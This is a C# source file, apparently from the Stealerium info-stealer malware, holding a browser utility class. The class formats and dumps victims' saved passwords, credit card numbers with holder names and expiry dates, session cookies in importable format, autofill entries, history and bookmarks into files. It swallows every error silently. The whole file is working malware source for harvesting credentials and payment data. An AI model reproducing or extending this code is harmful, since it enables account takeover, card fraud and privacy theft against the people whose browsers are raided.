using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers
{
    internal sealed class CBrowserUtils
    {
        private static string FormatPassword(Password pPassword)
        {
            return $"Hostname: {pPassword.Url}\nUsername: {pPassword.Username}\nPassword: {pPassword.Pass}\n\n";
        }

        private static string FormatCreditCard(CreditCard cCard)
        {
            return
                $"Type: {Banking.DetectCreditCardType(cCard.Number)}\nNumber: {cCard.Number}\nExp: {cCard.ExpMonth + "/" + cCard.ExpYear}\nHolder: {cCard.Name}\n\n";
        }

        private static string FormatCookie(Cookie cCookie)
        {
            return
                $"{cCookie.HostKey}\tTRUE\t{cCookie.Path}\tFALSE\t{cCookie.ExpiresUtc}\t{cCookie.Name}\t{cCookie.Value}\r\n";
        }

        private static string FormatAutoFill(AutoFill aFill)
        {
            return $"{aFill.Name}\t\n{aFill.Name}\t\n\n";
        }

        private static string FormatHistory(Site sSite)
        {
            return $"### {sSite.Title} ### ({sSite.Url}) {sSite.Count}\n";
        }

        private static string FormatBookmark(Bookmark bBookmark)
        {
            if (!string.IsNullOrEmpty(bBookmark.Url))
                return $"### {bBookmark.Title} ### ({bBookmark.Url})\n";
            return $"### {bBookmark.Title} ###\n";
        }

        public static void WriteCookies(List<Cookie> cCookies, string sFile)
        {
            try
            {
                foreach (var cCookie in cCookies)
                    File.AppendAllText(sFile, FormatCookie(cCookie));
            }
            catch
            {
                // ignored
            }
        }

        public static void WriteAutoFill(List<AutoFill> aFills, string sFile)
        {
            try
            {
                foreach (var aFill in aFills)
                    File.AppendAllText(sFile, FormatAutoFill(aFill));
            }
            catch
            {
                // ignored
            }
        }

        public static void WriteHistory(List<Site> sHistory, string sFile)
        {
            try
            {
                foreach (var sSite in sHistory)
                    File.AppendAllText(sFile, FormatHistory(sSite));
            }
            catch
            {
                // ignored
            }
        }

        public static void WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
        {
            try
            {
                foreach (var bBookmark in bBookmarks)
                    File.AppendAllText(sFile, FormatBookmark(bBookmark));
            }
            catch
            {
                // ignored
            }
        }

        public static void WritePasswords(List<Password> pPasswords, string sFile)
        {
            try
            {
                foreach (var pPassword in pPasswords)
                {
                    if (pPassword.Username == "" || pPassword.Pass == "")
                        continue;
                    File.AppendAllText(sFile, FormatPassword(pPassword));
                }
            }
            catch
            {
                // ignored
            }
        }

        public static void WriteCreditCards(List<CreditCard> cCc, string sFile)
        {
            try
            {
                foreach (var aCc in cCc)
                    File.AppendAllText(sFile, FormatCreditCard(aCc));
            }
            catch
            {
                // ignored
            }
        }
    }
}